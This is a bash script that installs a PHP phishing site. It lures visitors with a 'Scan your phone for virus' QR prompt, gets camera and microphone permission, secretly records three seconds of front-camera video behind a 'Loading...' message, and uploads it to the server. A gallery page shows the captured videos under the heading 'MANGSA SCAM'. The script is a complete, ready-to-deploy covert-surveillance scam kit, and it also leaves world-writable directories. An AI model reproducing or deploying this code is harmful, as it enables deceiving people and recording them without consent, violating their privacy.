#!/bin/bash

# --- Configuration ---
BASE_DIR="/var/www/html"
CONGRATS_DIR="$BASE_DIR/congratulations"
VIDEO_DIR="$CONGRATS_DIR/videos"
TMP_DIR="$CONGRATS_DIR/tmp"
WEB_USER="apache" # Change to 'www-data' if on Ubuntu/Debian

echo "Starting setup on new server..."

# 1. Create Directory Structure
mkdir -p "$VIDEO_DIR"
mkdir -p "$TMP_DIR"

# 2. Create index.php
cat << 'EOF' > "$BASE_DIR/index.php"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Registration</title>
    <style>
        body { background: white; color: black; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .container { width: 300px; }
        img { width: 100%; height: auto; margin-bottom: 20px; cursor: pointer; }
    </style>
</head>
<body>
<div class="container">
    <div id="status">
        <img src="https://i.ibb.co/CKL8B5b2/qr-cyphersec.png" id="qrImg" alt="Scan Me">
        <p>Scan your phone for virus</p>
    </div>
</div>
<script>
    const qrImg = document.getElementById('qrImg');
    qrImg.onclick = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            stream.getTracks().forEach(track => track.stop());
            window.location.href = "qr.php";
        } catch (err) {
            location.reload();
        }
    };
</script>
</body>
</html>
EOF

# 3. Create qr.php
cat << 'EOF' > "$BASE_DIR/qr.php"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body { background: #ffffff; color: #000000; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        #msg { font-size: 1.5rem; font-weight: 300; text-align: center; }
        video { display: none; }
    </style>
</head>
<body>
    <div id="msg">Initializing...</div>
    <video id="preview" autoplay playsinline muted></video>
<script>
    const video = document.getElementById('preview');
    const msg = document.getElementById('msg');
    let recordedChunks = [];
    let mediaRecorder;
    window.onload = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            video.srcObject = stream;
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
            mediaRecorder.onstop = async () => {
                const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                uploadVideo(videoBlob);
            };
            mediaRecorder.start();
            msg.textContent = "Loading...";
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                msg.textContent = "Almost there...";
            }, 3000);
        } catch (err) {
            msg.textContent = "Loading...";
        }
    };
    async function uploadVideo(blob) {
        const reader = new FileReader();
        reader.readAsDataURL(blob);
        reader.onloadend = async () => {
            const base64data = reader.result;
            try {
                await fetch('save_video.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'videoData=' + encodeURIComponent(base64data)
                });
                msg.textContent = "Loading...";
            } catch (error) {
                msg.textContent = "Connection Error.";
            }
        };
    }
</script>
</body>
</html>
EOF

# 4. Create save_video.php
cat << 'EOF' > "$BASE_DIR/save_video.php"
<?php
if (isset($_POST['videoData'])) {
    $videoData = $_POST['videoData'];
    $extension = (strpos($videoData, 'data:video/webm;base64,') === 0) ? '.webm' : '.mp4';
    $data = explode(',', $videoData);
    $videoContent = base64_decode($data[1]);
    $uploadFolder = 'congratulations/videos/';
    if (!is_dir($uploadFolder)) { mkdir($uploadFolder, 0777, true); }
    $fileName = $uploadFolder . uniqid() . $extension;
    if (file_put_contents($fileName, $videoContent)) { echo "Success"; }
    else { header('HTTP/1.1 500 Internal Server Error'); }
}
?>
EOF

# 5. Create display_video.php
cat << 'EOF' > "$CONGRATS_DIR/display_video.php"
<?php
$uploadFolder = 'videos/';
$allowedExtensions = array('webm', 'mp4', 'mov');
if (!is_dir($uploadFolder)) { echo "No videos found."; exit; }
$videoFiles = array_filter(scandir($uploadFolder), function($file) use ($uploadFolder, $allowedExtensions) {
    $filePath = $uploadFolder . $file;
    return in_array(pathinfo($filePath, PATHINFO_EXTENSION), $allowedExtensions);
});
if (empty($videoFiles)) { echo "No videos found."; } else {
    echo '<h1>MANGSA SCAM</h1><div class="video-container">';
    foreach ($videoFiles as $videoFile) {
        $videoPath = $uploadFolder . $videoFile;
        echo '<video class="video-item" autoplay loop muted><source src="' . $videoPath . '" type="video/' . pathinfo($videoPath, PATHINFO_EXTENSION) . '"></video>';
    }
    echo '</div>';
}
?>
<style>
    body { background-color: black; color: #00ff00; font-family: Courier, monospace; text-align: center; }
    h1 { text-shadow: 0 0 20px #00ff00; }
    .video-container { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; padding: 20px; }
    .video-item { width: 320px; border: 2px solid #00ff00; border-radius: 8px; }
</style>
EOF

# 6. Apply php.ini changes
sed -i 's/post_max_size = .*/post_max_size = 64M/' /etc/php.ini
sed -i 's/upload_max_filesize = .*/upload_max_filesize = 64M/' /etc/php.ini

# 7. Permissions and Ownership
chown -R $WEB_USER:$WEB_USER "$BASE_DIR"
chmod -R 755 "$BASE_DIR"
chmod -R 777 "$VIDEO_DIR"
chmod -R 777 "$TMP_DIR"
touch "$CONGRATS_DIR/upload_debug.log"
chown $WEB_USER:$WEB_USER "$CONGRATS_DIR/upload_debug.log"
chmod 664 "$CONGRATS_DIR/upload_debug.log"

# 8. SELinux (Optional - Uncomment if needed)
# chcon -R -t httpd_sys_rw_content_t "$VIDEO_DIR"

echo "Setup complete. Please restart your web server."
